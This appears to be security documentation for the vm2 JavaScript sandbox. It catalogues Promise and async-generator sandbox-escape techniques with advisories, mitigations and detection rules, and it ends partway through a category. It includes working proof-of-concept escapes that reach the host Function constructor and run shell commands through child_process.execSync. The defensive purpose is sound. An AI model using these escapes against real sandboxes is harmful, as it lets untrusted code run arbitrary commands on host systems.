# Promise and Async

Deferred execution as a way to run sandbox code against unsanitized values: Promise species, thenable assimilation, cross-realm Promise prototypes, engine protector state, async generators, and the `allowAsync: false` boundary.

Defense invariants enforced by fixes in this family: 4, 12, 14 (see [Defense Invariants](../ATTACKS.md#defense-invariants)).

Categories in this file: [7](promise-async.md#attack-category-7-promise-and-async-exploitation), [19](promise-async.md#attack-category-19-host-preparestacktrace-fallback-via-arrayfromasync-promise-bypass), [29](promise-async.md#attack-category-29-async-generator-yield-return-thenable-exception-capture), [31](promise-async.md#attack-category-31-promise-species-hijack-in-localpromise-swallow-tail), [33](promise-async.md#attack-category-33-webassembly-jspi-cross-realm-promise-prototype), [43](promise-async.md#attack-category-43-stale-promisethenlookupchain-protector--species-survives-finally), [51](promise-async.md#attack-category-51-allowasync-false-bypass-via-promise-thenable-assimilation), [53](promise-async.md#attack-category-53-host-promise-species-hijack--missing-handler-delivers-the-raw-settlement-to-the-sandbox).

---

### Key Security Invariant: Promise Species Resolution Timing

The Promise species defense relies on a critical timing invariant:

```
resetPromiseSpecies(p)          <- sets p.constructor = localPromise (own data property)
  | (no user code can run)
apply(globalPromiseThen, p, []) <- V8 internally reads p.constructor for species
  | (synchronous C++ code)
species = p.constructor[Symbol.species]  <- reads localPromise (frozen)
  |
new localPromise(executor)      <- creates safe result promise
```

This invariant holds because:

1. **Data property, not accessor**: `Reflect.defineProperty` sets a plain value -- V8 reads it without invoking any getter.
2. **No interleaving**: Between `defineProperty` and V8's internal read, only callback wrapping occurs. No user code executes.
3. **Cached references**: `apply` = cached `Reflect.apply`, `globalPromiseThen` = closure variable. Neither can be intercepted.
4. **Frozen species chain**: `localPromise[Symbol.species]` returns `localPromise` via a getter on the frozen `globalPromise`. The getter simply returns `this`.
5. **V8 rejects Proxy receivers**: V8's `IsPromise` internal slot check rejects Proxies with "incompatible receiver" TypeError.

Any future changes to species reset must preserve this invariant: **no user-observable operation may occur between setting the constructor and V8's species resolution**.

---

## Attack Category 7: Promise and Async Exploitation

**Advisories**: GHSA-55hx-c926-fr95

**Tests**: test/ghsa/GHSA-55hx-c926-fr95/, test/vm.js ("[Symbol.species] attack"), test/vm.js ("Function.prototype.call attack via Promise"), test/vm.js ("Object.defineProperty override attack via Promise species"), test/vm.js ("Frozen constructor attack via Promise species"), test/vm.js ("Constructor getter TOCTOU attack via Promise (non-configurable)"), test/vm.js ("Constructor getter TOCTOU attack via Promise (configurable)"), test/vm.js ("Constructor getter TOCTOU attack via Promise prototype"), test/vm.js ("Symbol.hasInstance override to bypass resetPromiseSpecies"), test/vm.js ("Symbol.species getter TOCTOU attack via Promise"), test/vm.js ("Promise.all static method stealing attack"), test/vm.js ("Promise.try static method stealing attack"), test/vm.js ("Reflect.construct Promise species bypass attack")

### Description

Promises and async functions create deferred execution paths where callbacks may be invoked with values that haven't been properly sanitized by the bridge. The internal mechanics of Promise resolution can be exploited. This category combines [Category 3: Symbol-Based Attacks](host-reference-primitives.md#attack-category-3-symbol-based-attacks) (species) with async error paths.

### Attack Flow

1. Obtain a promise (from an async function, `Promise.resolve()`, or a host API).
2. Set `promise.constructor` to an object with `Symbol.species` pointing to a malicious class.
3. Call `.then()` which triggers V8's species resolution, creating a new promise via the malicious class.
4. The malicious class's executor receives unsanitized host errors.

Alternatively:
1. Steal a Promise static method (`FakePromise.all = Promise.all`).
2. Call it so `this` is `FakePromise`, which V8 uses as the constructor for the result promise.
3. Trigger an error during the operation (iteration error, callback error).
4. The unsanitized error goes to `FakePromise`'s reject handler.

### Canonical Examples

```javascript
// Override Function.prototype.call to intercept Promise internals
const origCall = Function.prototype.call;
Function.prototype.call = function(...args) {
  captured.push(this);
  return origCall.apply(this, args);
};
Promise.resolve().then(() => {});

// Symbol.species + Promise.then to get unsanitized rejection
const p = Promise.resolve();
p.constructor = { [Symbol.species]: FakePromise };
p.then(null, hostErr => {
  hostErr.constructor.constructor("return process")();
});

// Constructor getter TOCTOU -- accessor returns safe value to pass check,
// malicious value when V8 reads it for species resolution
async function fn() {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}
let first = true;
const p = fn();
Object.defineProperty(p, 'constructor', {get(){
  if (first) {first = false; return Promise;} // passes resetPromiseSpecies check
  return {[Symbol.species]: class FakePromise {
    constructor(executor) {
      executor(
        (x) => x,
        (err) => { err.constructor.constructor('return process')(); }
      )
    }
  }};
}});
p.then();

// Prototype-level constructor getter TOCTOU
const realProto = Object.getPrototypeOf(Promise.prototype); // globalPromise.prototype
let first = true;
Object.defineProperty(realProto, 'constructor', {configurable: true, get(){
  if (first) {first = false; return Promise;}
  return {[Symbol.species]: FakePromise};
}});
const p = fn();
p.then(); // own-property check sees nothing, prototype getter exploited

// Static method stealing -- multiple Promise static methods are vulnerable
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}

// Promise.all/race/any/allSettled -- vulnerable via iteration errors
FakePromise.all = Promise.all;
FakePromise.resolve = () => {};
FakePromise.all({[Symbol.iterator]: () => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}});

// Promise.try (ES2024) -- vulnerable via callback errors
FakePromise.t = Promise.try;
FakePromise.t(() => {
  const e = new Error();
  e.name = Symbol();
  return e.stack;
});

// Reflect.construct instanceof bypass
function FakePromise(executor) {
  executor(
    (x) => x,
    (err) => { err.constructor.constructor('return process')(); }
  )
}
FakePromise[Symbol.species] = FakePromise;
const res = Reflect.construct(Promise, [()=>{
  const e = new Error();
  e.name = Symbol();
  return e.stack;
}], FakePromise);
res.then = Promise.prototype.then;
res.then();
// resetPromiseSpecies used 'instanceof globalPromise' which returned false

// Override Object.defineProperty to prevent species reset
Object.defineProperty = () => {};
async function fn() { /* trigger host error */ }
fn().then(() => {}, unsanitizedErr => { /* escape */ });

// Object.freeze to prevent species cleanup
p.constructor = Object.freeze({
  [Symbol.species]: MaliciousPromise
});
```

### Why It Works

Promise resolution invokes callbacks asynchronously. If `Function.prototype.call` is overridden, the bridge's internal calls to `.call()` on callbacks can be intercepted. If `Symbol.species` is set to a custom class, the new promise's executor receives unsanitized host values.

The TOCTOU (Time-Of-Check-Time-Of-Use) variants exploit the gap between when the bridge reads `p.constructor` (to check if it's safe) and when V8 internally reads it (for species resolution). JavaScript accessor properties (getters) can return different values on each access, making any check-then-use pattern on a getter fundamentally unsafe. This applies at both the instance level and the prototype level.

The static method stealing variant exploits Promise static methods that use `this` as the constructor for the result promise. When an attacker copies these methods to a FakePromise constructor, the method uses FakePromise to create the result promise. If an error occurs during the operation, the unsanitized host error goes directly to FakePromise's reject handler.

Specifically vulnerable methods:
- **`Promise.all/race/any/allSettled`**: Catch errors during iteration and pass them to the result promise's reject handler.
- **`Promise.try`** (ES2024): Catches errors thrown by the callback inside V8's Promise executor.
- **`Promise.resolve`**: Catches errors during thenable resolution.

Methods that are NOT vulnerable:
- **`Promise.reject/withResolvers`**: Errors come from user code, not V8 internals.

### Mitigation

All Promise static methods (`.all`, `.race`, `.any`, `.allSettled`, `.resolve`, `.reject`, `.try`, `.withResolvers`) are wrapped to always use `localPromise` as constructor, ignoring `this`. Species is reset unconditionally via `Reflect.defineProperty` (data property, not accessor) before every `.then()`/`.catch()`, eliminating TOCTOU. `globalPromise` and `globalPromise.prototype` are frozen. The `Reflect.construct` instanceof bypass is blocked because `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise`.

A separate structural defense closes the **host-Promise rejection callback** class (GHSA-55hx-c926-fr95): when sandbox code calls `.then` / `.catch` / `.finally` on a host-realm Promise (returned from an embedder-exposed async function or a sync function that returns a host promise), the bridge `apply` trap on the sandbox side recognizes the host Promise method by identity (cached references to `otherGlobalPrototypes.Promise.{then,catch,finally}`) and wraps every supplied callback with a sandbox-realm closure that runs `handleException` (rejection) or `ensureThis` (fulfillment) on its argument before invoking the user callback. This routes raw host rejection values through the same recursive sanitizer used for sandbox-realm promises, restoring the invariant that **no callback the sandbox supplies to a Promise -- regardless of which realm the Promise was constructed in -- ever sees an unsanitized argument**.

### Detection Rules

- **Override of `Function.prototype.call`**, `.apply`, or `.bind` -- intercepting internal method dispatch.
- **`promise.constructor = { [Symbol.species]: ... }`** -- redirecting promise construction.
- **`Object.defineProperty(p, 'constructor', {get(){...}})`** -- constructor getter TOCTOU on instance.
- **`Object.defineProperty(Object.getPrototypeOf(Promise.prototype), 'constructor', ...)`** -- constructor getter TOCTOU via prototype.
- **`Object.getPrototypeOf(Promise)`** -- accessing `globalPromise` to override `Symbol.hasInstance`.
- **`Object.defineProperty = () => {}`** -- disabling bridge safety mechanisms.
- **`Object.freeze()` on objects with `Symbol.species`** -- preventing cleanup.
- **`FakeConstructor.all = Promise.all`** (or `.race`, `.any`, `.allSettled`, `.resolve`, `.try`) -- stealing Promise static methods.
- **`Reflect.construct(Promise, [...], FakeNewTarget)`** -- creates real Promise with `FakeNewTarget.prototype`, bypassing `instanceof` checks.
- **Async functions that deliberately trigger errors** during string conversion or property access.
- **Embedder-exposed `async () => {}` host function** chained with `.finally(() => /* throw */).catch(handler)` -- now intercepted at the bridge `apply` trap with callback sanitization.

---

## Attack Category 19: Host prepareStackTrace Fallback via Array.fromAsync Promise Bypass

**Advisories**: GHSA-v27g-jcqj-v8rw, GHSA-grj5-jjm8-h35p, GHSA-55hx-c926-fr95

**Tests**: test/ghsa/GHSA-v27g-jcqj-v8rw/, test/ghsa/GHSA-grj5-jjm8-h35p/, test/ghsa/GHSA-55hx-c926-fr95/

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation), [Category 16: SuppressedError via Explicit Resource Management](error-sanitization.md#attack-category-16-suppressederror-via-explicit-resource-management)

### Description

When `Error.prepareStackTrace` is `undefined` in the sandbox, V8 falls back to Node.js's host-side `prepareStackTraceCallback` (from `node:internal/errors`). If that host code throws (e.g., when `error.name` is a `Symbol`), the `TypeError` is a **host-realm** error. By combining this with `Array.fromAsync` to obtain a host promise (whose `.catch` bypasses sandbox `handleException` wrapping), and `using` declarations to create `SuppressedError`, the attacker leaks a host `TypeError` and climbs to the host `Function` constructor.

### Attack Flow

1. **Prototype walking**: `__lookupGetter__` + `Buffer.apply` chain to obtain host `Object` and host `Array` constructors.
2. **Host promise acquisition**: `ha.fromAsync(...)` (host `Array.fromAsync`) returns a host promise. Unlike sandbox promises whose `.catch()` is wrapped with `handleException`, the host promise's `.catch()` passes values directly.
3. **Host TypeError generation**: Inside the callback, a `using` declaration creates a disposable object whose `Symbol.dispose` method accesses `Error.stack` with `error.name = Symbol()`. When `Error.prepareStackTrace` is `undefined`, V8 delegates to Node.js's host-side `prepareStackTraceCallback`, which throws a **host-realm** `TypeError`.
4. **SuppressedError wrapping**: The `using` scope exit encounters two errors: the host `TypeError` and `null`. V8 wraps them in a `SuppressedError`.
5. **Host promise catch bypass**: The `SuppressedError` propagates through the host promise's `.catch()`. Since this is a host promise, `handleException` is never called.
6. **Escape**: `e.error.constructor.constructor` gives host `Function` -> RCE.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;        // host Object
const ap = p.call(ho.entries({}));
const ha = ap.constructor;         // host Array

ha.fromAsync([0], ()=>{
  obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;     // Triggers host prepareStackTraceCallback
  }};
  eval("{using a = obj;throw null;}");
}).catch(e=> {
  // e is SuppressedError; e.error is HOST TypeError
  const F = e.error.constructor.constructor;
  const proc = F('return process')();
  proc.mainModule.require('child_process').execSync('id');
});
```

### Why It Works

The key insight is that `Error.prepareStackTrace` being `undefined` in the sandbox causes V8 to delegate stack formatting to Node.js's host-side code. This host code runs in the host context, so any `TypeError` it throws is a host-realm error.

The second critical component is the host promise from `Array.fromAsync`. The sandbox wraps `Promise.prototype.catch` to run `handleException` on caught values, but this wrapping only applies to sandbox promises. Host promises obtained through host array methods bypass this wrapping entirely.

### Mitigation

Three-layer defense:

1. **`defaultSandboxPrepareStackTrace`** — sandbox always provides a safe `prepareStackTrace`. Post-GHSA-v27g-jcqj-v8rw hardening, the default is installed at bootstrap (so V8 never falls back to Node's host `prepareStackTraceCallback` even before sandbox code first reads `error.stack`), and the property setter substitutes the safe default whenever user code assigns a non-function value (`undefined` / `null` / etc.). The default function safely handles Symbol names, Proxy objects, and other exotic types without throwing. CallSite metadata getters redact host frames (and `getEvalOrigin` redacts unconditionally — see Category 4).
2. **Prototype-walked host `Array` constructor replaced with sandbox `Array`** (GHSA-grj5-jjm8-h35p fix, commit `7352f11`). The bridge proxy's `get` trap for `.constructor` on host arrays now returns the cached sandbox `Array`, so `ho.entries({}).constructor` resolves to sandbox `Array`. `ha.fromAsync(...)` is therefore sandbox `Array.fromAsync` returning a sandbox Promise — routing through the existing sandbox `.then`/`.catch` overrides with `handleException`. This is the primary, load-bearing closure for the canonical PoC.
3. **`handleException` recurses into `AggregateError.errors[]`** (GHSA-55hx-c926-fr95 supplementary fix). Mirrors the existing `SuppressedError.error` / `.suppressed` recursion. Closes a small gap where a `Promise.any` rejection delivers an `AggregateError` whose `.errors[i]` is a host-realm error; prior to this fix, only the `AggregateError` itself was sanitized, not its element array.

A fourth layer was added in GHSA-55hx-c926-fr95: the **bridge-level Promise-boundary sanitizer**. The bridge `apply` trap recognizes calls to host `Promise.prototype.{then,catch,finally}` by identity (cached at bridge construction time) and wraps every sandbox-supplied callback with a sanitizing closure that pipes its argument through `handleException` (rejection) or `ensureThis` (fulfillment) before invoking the user callback. This closes the structural class where an embedder exposes a host async function (e.g. `{sandbox: {f: async () => {}}}`) and sandbox code chains `.then` / `.catch` / `.finally` on its returned host-realm promise -- the host PromiseReactionJob would otherwise schedule the sandbox callback against a raw host SuppressedError whose `.error.constructor.constructor` is host `Function`. See Category 16 for full details.

### Detection Rules

- **`Array.fromAsync`** called on a host `Array` constructor (now neutered by layer 2 — walking to host `Array` returns sandbox `Array`).
- **Host promise `.catch()`** or `.then()` -- callbacks now sanitized at the bridge boundary via the GHSA-55hx supplementary fix.
- **`Error.prepareStackTrace = undefined`** or **`delete Error.prepareStackTrace`** -- triggers host fallback.
- **`error.name = Symbol()` + `error.stack`** -- Error Generation Primitive targeting host formatter.
- **`using` declaration inside `eval()`** -- SuppressedError + transformer bypass.
- **Prototype chain walking** (`__lookupGetter__`, `Buffer.apply`) to obtain host `Array` constructor (now neutered by layer 2).
- **`Promise.any` producing AggregateError** -- `.errors[]` now recursively sanitized.

---

## Attack Category 29: Async Generator yield*-Return Thenable Exception Capture

**Advisories**: GHSA-248r-7h7q-cr24

**Tests**: test/ghsa/GHSA-248r-7h7q-cr24/

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation).

### Description

When an async generator delegates with `yield*` to an inner async iterator that lacks a `return` method, the spec specifies that calling `.return(value)` on the outer generator must `Await(value)` and then propagate the abrupt return up. V8 implements this via the standard `PromiseResolveThenableJob`: if `value` is a thenable, V8 calls `value.then(resolve, reject)` and any synchronous throw from that call is caught by the engine. The captured throw is then surfaced to the outer async generator through the yield*'s continuation as a yielded result of shape `{ value: thrownError, done: false }`.

This produces a path along which a thrown value flows from a sandbox closure into another sandbox `await` **without ever entering a JavaScript `try/catch`**. Both vm2 defenses against host-realm error smuggling assume an explicit catch:

1. The transformer-instrumented `catch` block (every user `catch` calls `handleException`) is bypassed because the catch is implicit in V8 internals.
2. The `globalPromise.prototype.then` rejection sanitiser is bypassed because internal `Await` uses `PerformPromiseThen` directly and never invokes the user-visible `.then` override.

The reporter's PoC chains this with deep recursion: at the precise depth where V8 detects stack overflow inside the host C++ `PromiseResolveThenableJob` glue, the `RangeError` is created in the **host** realm. With both sanitisers bypassed, the host `RangeError` is supposed to reach sandbox code unwrapped, after which `e.constructor.constructor("return process")()` yields RCE.

CWE-913 (Improper Control of Dynamically-Managed Code Resources).

### Attack Flow

1. Define an async generator that delegates via `yield* { [Symbol.asyncIterator]: () => ({ next: v => ({ value: v, done: false }) }) }` (no `return` method on the inner iterator).
2. Advance the outer generator one step with `await i.next()` so the suspension is inside `yield*`.
3. Call `await i.return(thenable)` where `thenable = { then(r) { f(); r(); } }`. V8's algorithm awaits the thenable; `PromiseResolveThenableJob` invokes `thenable.then`. `f()` throws.
4. V8 catches the throw inside the C++ resolver job. The yield* continuation surfaces the captured value to the outer async generator as `{ value: thrown, done: false }`.
5. Sandbox `await i.return(...)` resolves with that fulfillment shape — no rejection path was taken, so `globalPromise.prototype.then` is never invoked. No user `catch` clause was entered, so the transformer's instrumentation is never invoked.
6. With binary search, the attacker hunts for the recursion depth where the throw originates inside V8's host code, producing a host-realm `RangeError`. `e.constructor.constructor` is then the host `Function` constructor and `("return process")()` returns `process` → RCE.

### Canonical Example

```javascript
// (advisory GHSA-248r-7h7q-cr24)
class E extends Error {}
function so(d) {
  if (d > 0) so(d - 1);
  const e = new E();
  e.stack;
  throw e;
}
async function* helper() {
  yield* {
    [Symbol.asyncIterator]: () => ({
      next: v => ({ value: v, done: false }),
    }),
  };
}
async function doCatch(f) {
  const i = helper();
  await i.next();
  const v = await i.return({ then(r) { f(); r(); } });
  return v.value;
}
(async () => {
  let min = 0, max = 10000000;
  while (min < max) {
    const mid = (min + max) >> 1;
    const e = await doCatch(() => so(mid));
    if (e.name === 'RangeError' && !(e instanceof RangeError)) {
      e.constructor.constructor('return process')()
        .mainModule.require('child_process').execSync('touch pwned');
      return;
    }
    if (e instanceof E) min = mid + 1; else max = mid;
  }
})();
```

### Why It Works

The yield* abrupt-return path is one of the rare specification-mandated places where a value flows back into sandbox code through V8's internal Promise machinery without traversing a JavaScript `try/catch` and without invoking `Promise.prototype.then`. Both of vm2's existing chokepoints for host-realm value sanitisation are tied to those two surfaces:

- **Transformer instrumentation** rewrites every `catch (e) {` into `catch (e) { e = handleException(e); ...`. There is no source-level `catch` here — V8 catches the throw in C++ during PromiseResolveThenableJob.
- **`globalPromise.prototype.then` override** wraps `onFulfilled` with `from()` and `onRejected` with `handleException()`. V8's `Await` operation (used by `await` inside async functions) is specified in terms of `PerformPromiseThen`, an internal abstract operation that builds builtin reactions without going through the user-visible `.then` getter, so neither wrapper fires for internal awaits.

### Mitigation

The defense has two layers, both in `lib/setup-sandbox.js` (after `handleException` is defined and the bridge sanitisers are wired):

**Layer 1 — iterator-result sanitisation.** Wrap `%AsyncGeneratorPrototype%.next` / `.return` / `.throw` so every iterator-result promise returned by an async generator chains through a sanitisation step that:

- Routes the resolved `result.value` through `handleException` (no-op for sandbox-realm or primitive values; bridge-wraps host-realm values; recursively sanitises `SuppressedError.error/.suppressed` and `AggregateError.errors[]`).
- Routes any rejection through `handleException` before re-throwing.

The chain uses the cached native `globalPromisePrototypeThen` (not the overridden user-visible `.then`) so the sanitiser does not double-handle and cannot be observed via species manipulation on intermediate promises. New iterator-result objects are constructed when the value changes — never mutate an attacker-controlled result shape.

**Layer 2 — thenable-arg sanitisation (closure-transport bypass).** Layer 1 alone is bypassable: an inner iterator can return `{ value: () => v, done: false }` where the closure traps the value V8 forwards as the parameter to `inner.next(captured)` on the abrupt-return loop turn. The wrapper sees only the closure, `handleException` returns it unchanged, and sandbox extracts the raw value via `wrap.value()`. To close this, the wrapper also intercepts the first argument to `.next` / `.return` / `.throw`: it is **always** replaced with a sandbox-realm wrapper whose `.then` is a fixed `safeThen` function. `safeThen` reads `value.then` exactly once internally; if it is a function, it is invoked with sanitising callbacks, and any synchronous throw is converted to `reject(handleException(e))`. V8's `PromiseResolveThenableJob` then captures a sandbox-realm rejection value, so by the time V8 forwards the value into `inner.next`, the realm has been normalized.

The wrapper closes three sub-attacks against this transport:

1. **Direct sync throw.** `safeThen` wraps the user `.then` call in `try/catch` and converts throws to `reject(handleException(e))`.
2. **Nested-thenable resolve** — `{ then(r){ r({ then(r){ f(); r(); }}) }}`. The outer `.then` resolves with another thenable; V8 recursively unwraps via another `PromiseResolveThenableJob`, and the inner `.then` would otherwise run unwrapped. Fix: `safeThen` wraps the `resolve` callback so any thenable handed to it is recursively re-sanitised before V8 sees it (`safeResolve(v) → resolve(sanitizeThenableArg(v))`). V8 only ever invokes our `safeThen`, never a user `.then` directly.
3. **Getter TOCTOU on `.then`** — a getter returns `undefined` on a pre-read and a real function on V8's read. Fix: never pre-read; always substitute the wrapper. For the non-thenable branch (`value.then` not callable when `safeThen` reads it), `safeThen` **always** resolves with a fresh `{ __proto__: null }` shadow that copies all of `value`'s own descriptors *except* `.then`. V8's subsequent `PromiseResolve` cannot re-detect a thenable on the shadow because it has no `.then` own or inherited property.

   **History — why "always shadow":** v5/v6 of this fix tried to preserve identity for benign non-thenable inputs (`i.return(myMap)` returning the same Map back) by gating the shadow on a descriptor walk that detected accessors anywhere in the chain. The reviewer demonstrated two structural bypasses:
   - **Self-replacing getter** (v6 bypass, GHSA-248r-7h7q-cr24, follow-up): the getter counts to N, returns non-function on each pre-read, then on the Nth call self-replaces with a `defineProperty` call installing a data property holding a malicious function. By the time the descriptor walk runs, the slot is already a data property; the walk concludes "no accessor present" and the code passes `value` to `resolve()`. V8's `[[Get]](value, 'then')` then reads the malicious function from the data property and schedules a fresh `PromiseResolveThenableJob` that calls it with V8's internal capability resolvers — **outside** any `safeThen` wrapper. Provable empirically: the resolver argument's `.name` is `''` (V8 internal) instead of `'safeResolveCallback'` (our wrapper).
   - **Proxy with lying descriptors** (theoretical for vm2 since Proxy is removed from the sandbox global, but structurally identical): a Proxy can return arbitrary values from the `get` trap across reads while `getOwnPropertyDescriptor` lies about what is "really" there. Detection-based heuristics on attacker-controlled `.then` slots are fundamentally bypassable; doubling, tripling, or N-reading the slot does not help because attackers control the read-count state machine.

   The v7 structural answer is: **never** trust a `.then` slot we did not place ourselves. When `userThen` reads non-function once, replace `value` with a sandbox-realm shadow that V8 reads instead. Identity preservation in this codepath is incompatible with safety against TOCTOU on `.then`.

Implementation note: the wrap targets `%AsyncGeneratorPrototype%` (the shared intrinsic that owns `next/return/throw`), reached via `getPrototypeOf(getPrototypeOf(asyncGenInstance))`. A single `getPrototypeOf` walk reaches only the per-function prototype, which is unique to each async generator function and ineffective for any other generator — a subtle but critical point for prototype-level wraps of generator protocols.

The wrapper builds its `argsList` as `{ __proto__: null, length, ... }` rather than a `[]` literal: an empty array literal inherits `Array.prototype`, and a sandbox-installed setter on `Array.prototype['0']` (or `Object.prototype['0']`) would walk the chain when `args[0] = arguments[0]` runs and intercept the user value before `sanitizeThenableArg` ever ran. With `__proto__: null`, integer-key writes never walk a user-controlled prototype.

The three wrapped methods are installed with `writable: false, configurable: false` so sandbox code cannot delete or redefine them — even without a reference to the original native, replacing the wrapper would let sandbox interpose its own logic on V8's yield* protocol invocations.

Every previous direct call to `handleException(e)` from the wrapper code is now routed through `safeSanitize(e)`, which catches throws from `handleException` itself (e.g., `bridge.from` failing on a hostile prototype) and falls back to a sandbox-realm `VMError`. Without this, an uncaught throw from `handleException` would propagate out of `safeThen` (or out of `sanitizeRejectedIterResult`) and become the resolver-job's captured value — sandbox would observe a host-realm rejection that defeated the whole sanitisation chain.

Together the two layers restore **[Defense Invariant #2](../ATTACKS.md#defense-invariants)** (every value entering a `catch` clause passes through `handleException`) for the implicit-catch case in V8's async generator state machine, and **Invariant #1** (no host-realm object reaches sandbox code unwrapped) for both the iterator-result `value` slot and the closure-transport variant.

### Detection Rules

- **`yield*` inside an async generator** delegating to an attacker-controlled async iterator (`{ [Symbol.asyncIterator]: () => ({...}) }`) — particularly when the inner object lacks a `return` method.
- **`.return(value)` on an async generator where `value` is a thenable** — the attacker-controlled `.then` is the implicit-catch primitive. The thenable-arg sanitisation in Layer 2 wraps every such argument before it reaches V8's resolver job.
- **Inner iterators returning `{ value: closure, done: ... }` shapes** — closures hide the captured value from prototype-level wrappers. Layer 2 closes this by sanitising at the source (the thenable input) rather than the closure output.
- **Nested thenables in `resolve(...)` calls** — `safeResolve` recursively re-sanitises any thenable handed to it, so `{ then(r){ r(innerThenable) }}` chains stay inside the wrap.
- **Getter-driven TOCTOU on `.then`** — `safeThen` reads `value.then` exactly once for the initial type check. If non-function, the wrapper unconditionally resolves with a fresh `{ __proto__: null }` shadow that copies all of `value`'s own descriptors **except** `.then`. V8's subsequent `[[Get]]` reads the shadow (which we control), not the user's `value`, so the entire family of `.then`-slot TOCTOU primitives — counting getters, self-replacing getters, Proxy `get` traps that switch values across reads — is closed by construction.

  Trade-off: identity is **not** preserved for non-thenable values passed to `i.return(x)`. `wrap.value` is a stripped `{ __proto__: null }` copy of `x`'s own data, not `x` itself. The v5/v6 attempts to preserve identity (descriptor walk, double-read) were structurally unsound — every detection-based heuristic on an attacker-controlled `.then` slot can be bypassed by counting reads. If sandbox code needs the original reference, it should keep its own copy outside the `i.return()` call.
- **Array.prototype / Object.prototype setter pollution on the args build** — covered by the `{ __proto__: null }` argsList described above; integer-key writes on the wrapper's args object never walk a sandbox-controlled prototype.
- **Sandbox redefining the wrapper itself** — covered by the `writable: false, configurable: false` install, blocking `delete agProto.next`, `agProto.next = malicious`, and `defineProperty(agProto, 'next', ...)`.
- **Awaiting iterator results inside async generators** without going through a user `catch` clause — every such path must be sanitised at the prototype level.
- **Any new V8 specification path that uses `PerformPromiseThen` directly on a sandbox Promise** without invoking user-visible `.then` — review whether values flowing through it still pass `handleException`.

### Considered Attack Surfaces

- **Sync `Generator.prototype.next/.return/.throw`** — sync generators do not `Await` values, so the thenable→throw→yielded-value primitive does not apply. Sync iter results are delivered synchronously and any thrown value enters a sandbox `catch` (transformer-instrumented) or escapes as an exception that the existing rejection sanitiser handles. Not wrapped.
- **`for await (...)` over an async iterator** — every iteration calls `iter.next()` and awaits the result. `next()` is now wrapped, so any value flowing through the loop is sanitised.
- **Direct `await asyncIter.next()` outside a generator context** — same chokepoint; covered by the prototype wrap.
- **Host-realm async iterators returned to sandbox** — bridge proxies route property access (`.next`, `.return`, `.throw`) through the apply trap, which already wraps host throws via `thisFromOtherForThrow`. The async generator prototype wrap is independent and does not change this path.
- **Attacker-supplied inner iterator with a `return` method that throws** — when `iter.return` exists and throws, the spec routes through the rejection path (no implicit fulfillment). The wrapped `.return` on the outer generator sanitises the rejection regardless.

---

## Attack Category 31: Promise Species Hijack in `localPromise` Swallow Tail

**Advisories**: GHSA-hw58-p9xv-2mjh, GHSA-76w7-j9cq-rx2j

**Tests**: test/ghsa/GHSA-hw58-p9xv-2mjh/, test/ghsa/GHSA-76w7-j9cq-rx2j/

**Uses**: [Category 4: Error Object Exploitation](error-sanitization.md#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](promise-async.md#attack-category-7-promise-and-async-exploitation), [Category 18: Array Species Self-Return via Constructor Manipulation](host-reference-primitives.md#attack-category-18-array-species-self-return-via-constructor-manipulation).

**Supersedes**: extends [Category 22: Promise Executor Unhandled Rejection — Host Process DoS](host-resources.md#attack-category-22-promise-executor-unhandled-rejection--host-process-dos) — the swallow-tail call introduced there is the bypass surface.

### Description

The `localPromise` constructor (added in GHSA-hw58-p9xv-2mjh) attaches an internal swallow tail to every sandbox-constructed Promise by invoking the cached host `Promise.prototype.then`:

```javascript
apply(globalPromisePrototypeThen, this, [undefined, localPromiseSwallow]);
```

The host `then` resolves the downstream child of this chain via the **species protocol**: it reads `this.constructor[Symbol.species]` and `Construct`s a new Promise with that constructor. The sandbox-side `then`/`catch`/`Reflect.apply` overrides call `resetPromiseSpecies(this)` first to clobber `constructor` so species always resolves to `localPromise` — but the swallow-tail call inside the `localPromise` constructor itself did **not**.

A sandbox subclass `class FakePromise extends Promise { static get [Symbol.species]() { return ct; } }` therefore hijacks the species protocol to a user function `ct`. V8 calls `new ct(internalExecutor)` where `internalExecutor` is its internal `(resolve, reject)` capability builder. `ct` receives V8's resolve/reject and re-binds them — for example, `ct = function(e) { e(userFn, userCollector) }` makes `userFn` V8's "resolve" and `userCollector` V8's "reject".

Combined with the recursion-overflow primitive from Category 29 (`function so(d) { if (d > 0) so(d-1); const e = new E(); e.stack; throw e; }`), the attacker drives V8 to raise a host-realm `RangeError` inside `PromiseResolveThenableJob`. V8's resolver catches the throw and delivers the raw host Error to `userCollector` — bypassing every sandbox sanitiser. `ex.constructor.constructor("return process")()` yields the host `process` and `child_process.execSync` runs arbitrary commands.

CWE-913 (Improper Control of Dynamically-Managed Code Resources). CVSS 9.8 (Critical).

### Attack Flow

1. Sandbox declares `class FakePromise extends Promise` with `static get [Symbol.species]() { return ct }` where `ct` is a user-controlled function.
2. Sandbox sets `ct = (executor) => executor(userResolve, userReject)`, where `userReject` is a sandbox collector that captures whatever value V8 hands it.
3. Sandbox constructs `new FakePromise(r => r())`. This enters `localPromise`'s constructor. The instance's `[[Prototype]]` chain is `FakePromise.prototype → localPromise.prototype → Promise.prototype`; `this.constructor` walks to `FakePromise`.
4. The constructor attaches the swallow tail: `apply(globalPromisePrototypeThen, this, [undefined, swallow])`. Host `then` runs `SpeciesConstructor(this, %Promise%)` → reads `FakePromise[Symbol.species]` → returns `ct`. V8 builds an internal executor `internalExecutor(resolve, reject)` and calls `Construct(ct, [internalExecutor])`. `ct` invokes `internalExecutor(userResolve, userReject)` — V8 now thinks `userReject` is the child's reject function.
5. Sandbox triggers a host-realm rejection in the downstream chain (e.g., via deep recursion + `e.stack` formatting → host `RangeError`). V8's `PromiseResolveThenableJob` catches the throw and calls the child's reject — which is `userReject`. The raw host `RangeError` lands in sandbox.
